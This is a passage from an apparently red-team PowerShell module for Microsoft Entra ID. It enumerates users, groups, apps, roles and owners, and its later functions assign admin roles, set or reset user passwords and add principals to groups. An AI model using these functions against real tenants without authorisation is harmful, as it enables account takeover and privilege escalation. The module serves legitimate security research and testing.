        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $DeviceID = $False
    )

    # Get the device user(s)
    $URI = "https://graph.microsoft.com/beta/devices/$($DeviceID)/registeredUsers"
    $Results = $null
    $DeviceUsers = $null
    $Results = Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
            ConsistencyLevel = "eventual"
        } `
        -URI $URI `
        -UseBasicParsing `
        -Method "GET" `
        -ContentType "application/json"
    if ($Results.value) {
        $DeviceUsers += $Results.value
    }

    $DeviceUsers
}

Function Get-AllEntraRoles {
    <#
    .SYNOPSIS
        Retrieves all active Entra ID admin roles

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Retrieves all active Entra ID admin roles

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to read Entra admin roles

    .EXAMPLE
        C:\PS> $EntraAdminRoles = Get-AllEntraRoles `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to list the active Entra admin roles

    .LINK
        https://learn.microsoft.com/en-us/graph/api/directoryrole-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Using the provided token, get the active Entra ID roles
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoles'
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($Token)"} `
                        -URI $URI `
                        -Method GET
    $EntraIDRoles = $Request.value

    $EntraIDRoles

}
New-Variable -Name 'Get-AllEntraRolesDefinition' -Value (Get-Command -Name "Get-AllEntraRoles") -Force
New-Variable -Name 'Get-AllEntraRolesAst' -Value (${Get-AllEntraRolesDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AllEntraApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Entra application registration objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Entra application registration objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to Entra apps
    
    .EXAMPLE
    C:\PS> $Apps = Get-AllEntraApps -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all apps and put them into the $Apps variable
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all apps
    $URI = "https://graph.microsoft.com/beta/applications/?`$count=true"
    $Results = $null
    $AppObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Applications" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalAppCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $AppObjects += $Results.value
        } else {
            $AppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($AppObjects.count/$TotalAppCount)*100))
            Write-Progress -Activity "Enumerating Applications" -Status "$($PercentComplete)% complete [$($AppObjects.count) of $($TotalAppCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $AppObjects
}

Function Get-AllEntraServicePrincipals {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Entra service principal objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Entra service principal objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to Entra service principals
    
    .EXAMPLE
    C:\PS> $ServicePrincipals = Get-AllEntraServicePrincipals -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all service principals and put them into the $ServcePrincipals variable
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/serviceprincipal-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all service principals
    $URI = "https://graph.microsoft.com/beta/servicePrincipals/?`$count=true"
    $Results = $null
    $ServicePrincipalObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Service Principals" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalServicePrincipalCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $ServicePrincipalObjects += $Results.value
        } else {
            $ServicePrincipalObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($ServicePrincipalObjects.count/$TotalServicePrincipalCount)*100))
            Write-Progress -Activity "Enumerating Service Principals" -Status "$($PercentComplete)% complete [$($ServicePrincipalObjects.count) of $($TotalServicePrincipalCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $ServicePrincipalObjects
}

Function Get-EntraServicePrincipal {
    <#
    .SYNOPSIS
        Retrieves the JSON-formatted Entra service principal objects specified by its object ID
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves the JSON-formatted Entra service principal objects specified by its object ID
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to Entra service principals

    .PARAMETER ObjectID
        The object ID (NOT the app id) of the service principal
    
    .EXAMPLE
    C:\PS> $ServicePrincipal = Get-EntraServicePrincipal `
        -Token $Token
        -ObjectID "3e5d6a11-0898-4c1f-ab69-c10115770e57"
    
    Description
    -----------
    Uses the JWT in the $Token variable to fetch the service principal with object id starting with "3e5..."
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/serviceprincipal-get?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ObjectID
    )

    # Get the service principal
    $URI = "https://graph.microsoft.com/beta/servicePrincipals/$($ObjectID)"
    $ServicePrincipal = Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
            ConsistencyLevel = "eventual"
        } `
        -URI $URI `
        -UseBasicParsing `
        -Method "GET" `
        -ContentType "application/json"

    $ServicePrincipal
}

Function Get-AllEntraUsers {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Entra users objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Entra users objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to Entra users
    
    .EXAMPLE
    C:\PS> $Users = Get-AllEntraUsers -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all users and put them into the $Users variable
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/user-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all users
    $URI = "https://graph.microsoft.com/beta/users/?`$count=true"
    $Results = $null
    $UserObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Users" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalUserCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $UserObjects += $Results.value
        } else {
            $UserObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($UserObjects.count/$TotalUserCount)*100))
            Write-Progress -Activity "Enumerating Users" -Status "$($PercentComplete)% complete [$($UserObjects.count) of $($TotalUserCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $UserObjects
}

Function Get-AllEntraGroups {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Entra groups objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Entra groups objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to Entra groups
    
    .EXAMPLE
    C:\PS> $Groups = Get-AllEntraGroups -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all groups and put them into the $Groups variable
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/group-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all groups
    $URI = "https://graph.microsoft.com/beta/groups/?`$count=true"
    $Results = $null
    $GroupsObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Groups" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalGroupsCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $GroupsObjects += $Results.value
        } else {
            $GroupsObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($GroupsObjects.count/$TotalGroupsCount)*100))
            Write-Progress -Activity "Enumerating Groups" -Status "$($PercentComplete)% complete [$($GroupsObjects.count) of $($TotalGroupsCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $GroupsObjects
}

Function Get-EntraGroupMembers {
    <#
    .SYNOPSIS
        Get the list of members of an Entra group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Get the list of members of an Entra group

    .PARAMETER GroupID
        The globally unique ID of the target security group

    .PARAMETER Token
        The MS Graph-scoped JWT for the princpal you are authenticating as

    .EXAMPLE
        C:\PS> Get-EntraGroupMembers `
            -GroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -Token $MGToken

        Description
        -----------
        List the members of the group whose object ID starts with "b98..."

    .LINK
        https://learn.microsoft.com/en-us/graph/api/group-list-members?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GroupID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://graph.microsoft.com/v1.0/groups/$($GroupID)/members" 
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $EntraGroupMembers += $Results.value
        } else {
            $EntraGroupMembers += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $EntraGroupMembers
}

Function Get-EntraRoleTemplates {
    <#
    .SYNOPSIS
        Retrieves the available Entra ID admin role templates

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Retrieves the available Entra ID admin role templates

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to list Entra admin role templates

    .EXAMPLE
        C:\PS> $EntraRoleTemplates = Get-EntraRoleTemplates `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to list the available Entra admin role templates

    .LINK
        https://learn.microsoft.com/en-us/graph/api/directoryroletemplate-get?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Using the provided token, get the current list of available Entra ID admin role templates:
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoleTemplates'
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($Token)"} `
                        -URI $URI `
                        -Method GET
    $EntraIDRoleTemplates = $Request.value

    $EntraIDRoleTemplates

}
New-Variable -Name 'Get-EntraRoleTemplatesDefinition' -Value (Get-Command -Name "Get-EntraRoleTemplates") -Force
New-Variable -Name 'Get-EntraRoleTemplatesAst' -Value (${Get-EntraRoleTemplatesDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MGAppRoles {
    <#
    .SYNOPSIS
        Gets the current list of available MS Graph app roles

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Finds the MS Graph Service Principal, then lists the available App Roles that can be scoped to Microsoft Graph

    .PARAMETER Token
        An MS-Graph scoped JWT for an Entra user

    .EXAMPLE
        Get-MGAppRoles -Token $Token.access_token

        Description
        -----------
        List all available Microsoft Graph App Roles

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Find the MS Graph service principal by its universal app ID, which is "00000003-0000-0000-c000-000000000000"
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"
    $MSGraphSP = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($Token)"} `
        -URI $URI `
        -Method GET

    $MSGraphSP.value.appRoles
}

Function Get-EntraServicePrincipalOwner {
    <#
    .SYNOPSIS
        List the current owner(s) of an Entra Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        List the current owner(s) of an Entra Service Principal

    .PARAMETER ServicePrincipalObjectId
        The object ID of the target Service Principal - NOT the app id.

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to read Service Principal owners. By default
        any authenticated user can read this information without any special privileges.

    .EXAMPLE
        C:\PS> Get-EntraServicePrincipalOwner `
            -ServicePrincipalObjectId 'd9786def-03b9-458a-8ba1-3af3a25745de' `
            -Token $Token

        Description
        -----------
        List the owner(s) of the Service Principal with object ID of 'd9786def-03b9-458a-8ba1-3af3a25745de'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/serviceprincipal-list-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $ServicePrincipalObjectId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalObjectId)/owners"
    $Results = $null
    $SPOwners = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $SPOwners += $Results.value
        } else {
            $SPOwners += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $SPOwners
}
New-Variable -Name 'Get-EntraServicePrincipalOwnerDefinition' -Value (Get-Command -Name "Get-EntraServicePrincipalOwner") -Force
New-Variable -Name 'Get-EntraServicePrincipalOwnerAst' -Value (${Get-EntraServicePrincipalOwnerDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-EntraAppOwner {
    <#
    .SYNOPSIS
        List the current owner(s) of an Entra App Registration

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        List the current owner(s) of an Entra App Registration

    .PARAMETER AppObjectID
        The object ID of the target App - NOT the app id.

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to read App owners. By default
        any authenticated user can read this information without any special privileges.

    .EXAMPLE
        C:\PS> Get-EntraAppOwner `
            -AppObjectID '52114a0d-fa5b-4ee5-9a29-2ba048d46eee' `
            -Token $Token

        Description
        -----------
        List the owner(s) of the App with object ID of '52114a0d-fa5b-4ee5-9a29-2ba048d46eee'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/application-list-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AppObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://graph.microsoft.com/v1.0/applications/$($AppObjectID)/owners"
    $Results = $null
    $AppOwners = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $AppOwners += $Results.value
        } else {
            $AppOwners += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $AppOwners
}
New-Variable -Name 'Get-EntraAppOwnerDefinition' -Value (Get-Command -Name "Get-EntraAppOwner") -Force
New-Variable -Name 'Get-EntraAppOwnerAst' -Value (${Get-EntraAppOwnerDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-EntraGroupOwner {
    <#
    .SYNOPSIS
        List the current owner(s) of an Entra Group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        List the current owner(s) of an Entra Group

    .PARAMETER GroupObjectID
        The object ID of the target Group

    .PARAMETER Token
        The MS-Graph scoped JWT for a principal with the ability to read Group owners. By default
        any authenticated user can read this information without any special privileges.

    .EXAMPLE
        C:\PS> Get-GroupOwner `
            -GroupObjectID '352032bf-161d-4788-b77c-b6f935339770' `
            -Token $Token

        Description
        -----------
        List the owner(s) of the Group with object ID of '352032bf-161d-4788-b77c-b6f935339770'.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/graph/api/group-list-owners?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GroupObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://graph.microsoft.com/v1.0/groups/$($GroupObjectID)/owners"
    $Results = $null
    $GroupOwners = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $GroupOwners += $Results.value
        } else {
            $GroupOwners += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $GroupOwners
}
New-Variable -Name 'Get-EntraGroupOwnerDefinition' -Value (Get-Command -Name "Get-EntraGroupOwner") -Force
New-Variable -Name 'Get-EntraGroupOwnerAst' -Value (${Get-EntraGroupOwnerDefinition}.ScriptBlock.Ast.Body) -Force

## ################################### ##
## Entra Object Manipulation Functions ##
## ################################### ##

Function Enable-EntraRole {
    <#
    .SYNOPSIS
        Enables (or "activates") the Entra role by its provided ID

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Enables (or "activates") the Entra role by its provided ID

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to activate Entra admin roles

    .EXAMPLE
        C:\PS> $EntraRoleTemplates = Enable-EntraRoleTemplates `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to list the available Entra admin role templates

    .LINK
        https://learn.microsoft.com/en-us/graph/api/directoryroletemplate-get?view=graph-rest-1.0&tabs=http
        https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.4#lifecycle-verbs
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RoleID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Using the provided token, activate the Entra ID admin roles by its provided template ID
    $body = @{
        roleTemplateId = $RoleID
    }
    Try {
        $ActivateRole = Invoke-RestMethod `
            -Uri "https://graph.microsoft.com/v1.0/directoryRoles" `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -Method POST `
            -ContentType 'application/json' `
            -Body $($body | ConvertTo-Json)
    }
    Catch {
    }
}
New-Variable -Name 'Enable-EntraRoleDefinition' -Value (Get-Command -Name "Enable-EntraRole") -Force
New-Variable -Name 'Enable-EntraRoleAst' -Value (${Enable-EntraRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function New-EntraRoleAssignment {
    <#
    .SYNOPSIS
        Assigns an Entra admin role to a specified principal by its object id

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Assigns an Entra admin role to a specified principal by its object id

    .PARAMETER PrincipalID
        The ID of the principal you are trying to assign the role to

    .PARAMETER RoleDefinitionId
        The globally unique ID of the Entra admin role

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to assign Entra admin roles

    .EXAMPLE
        C:\PS> New-EntraRoleAssignment `
            -PrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -RoleDefinitionID "62e90394-69f5-4237-9190-012177145e10" `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to assign the Entra admin role with the template ID of 
        '62e90394-69f5-4237-9190-012177145e10' to the Entra principal with the object ID 
        of '028362ca-90ae-41f2-ae9f-1a678cc17391'

    .LINK
        https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/custom-assign-graph
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RoleDefinitionID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    $body = @{
        "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
        principalId = $PrincipalID
        roleDefinitionId = $RoleDefinitionID
        directoryScopeId = "/"
    }

    Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
}
New-Variable -Name 'New-EntraRoleAssignmentDefinition' -Value (Get-Command -Name "New-EntraRoleAssignment") -Force
New-Variable -Name 'New-EntraRoleAssignmentAst' -Value (${New-EntraRoleAssignmentDefinition}.ScriptBlock.Ast.Body) -Force

Function Set-EntraUserPassword {
    <#
    .SYNOPSIS
        Attempts to set an Entra user password to a provided value. Returns the raw payload from the Graph API.
        If successful, the Graph API response status code will be "204".

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to set an Entra user password to a provided value

    .PARAMETER Token
        An MS Graph scoped JWT for an Entra user or service principal with the ability to set the target user's password

    .PARAMETER TargetUserID
        The unique identifier of the target user you want to update the password for

    .PARAMETER Password
        The new password you want the target user to have

    .EXAMPLE
        Set-EntraUserPassword -Token $MGToken -TargetUserID "f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf" -Password "SuperSafePassword12345"

        Description
        -----------
        Sets the user with object ID starting with "f5e..."'s password to "SuperSafePassword12345"

    .LINK
        https://docs.microsoft.com/en-us/graph/api/passwordauthenticationmethod-resetpassword?view=graph-rest-beta&tabs=http#request
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetUserID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Password
    )

    $Body = @{
        passwordProfile = @{
            forceChangePasswordNextSignIn = "false"
            password = $Password
        }
    }

    $SetPasswordRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://graph.microsoft.com/v1.0/users/$TargetUserID" `
        -Method "PATCH" `
        -Headers @{
            "Authorization"="Bearer $Token"
        } `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-Json)

    $SetPasswordRequest
}

Function Reset-EntraUserPassword {
    <#
    .SYNOPSIS
        Attempts to reset an Entra user password. If successful, returns the new temporary password for the user.
        This will only work if the supplied JWT is associated with a user. It will not work if the JWT is associated with a service principal.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to reset an Entra user password. If successful, returns the new temporary password for the user.

    .PARAMETER Token
        An Azure Portal scoped JWT for an Entra user with the ability to reset the target user's password

    .PARAMETER TargetUserID
        The unique identifier of the target user you want to reset the password for

    .EXAMPLE
        Reset-AZUserPassword -Token $MGToken -TargetUserID "bf51..."

        Description
        -----------
        Reset the password for the user with object ID starting with "bf51..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetUserID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    $ResetPasswordRequest = Invoke-WebRequest -UseBasicParsing -Uri "https://main.iam.ad.ext.azure.com/api/PasswordReset/ResetPasswordByUpn?userPrincipalName=$($TargetUserID)" `
        -Method "PUT" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
            "x-ms-client-request-id"= (New-Guid).guid
        } `
        -ContentType "application/json" `
        -Body "{}"
    
    $ResetPasswordRequest
}

Function Add-MemberToEntraGroup {
    <#
    .SYNOPSIS
        Attempts to add a principal to an existing Entra security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to add a principal to an existing Entra security group

    .PARAMETER PrincipalID
        The ID of the principal you want to add to the group. You can only add Entra principals to Entra groups.

    .PARAMETER TargetGroupId
        The globally unique ID of the target security group

    .PARAMETER Token
        The MS Graph-scoped JWT for the princpal you are authenticating as

    .EXAMPLE
        C:\PS> Add-MemberToEntraGroup `
            -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -Token $MGToken

        Description
        -----------
        Attempt to add the principal with ID starting with "028..." to the Entra group with ID starting with "b98..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($PrincipalID)"
    }

    $AddMemberRequest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True

    $AddMemberRequest
}

Function New-EntraAppSecret {
    <#
    .SYNOPSIS
        Add a new secret to an existing app registration object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
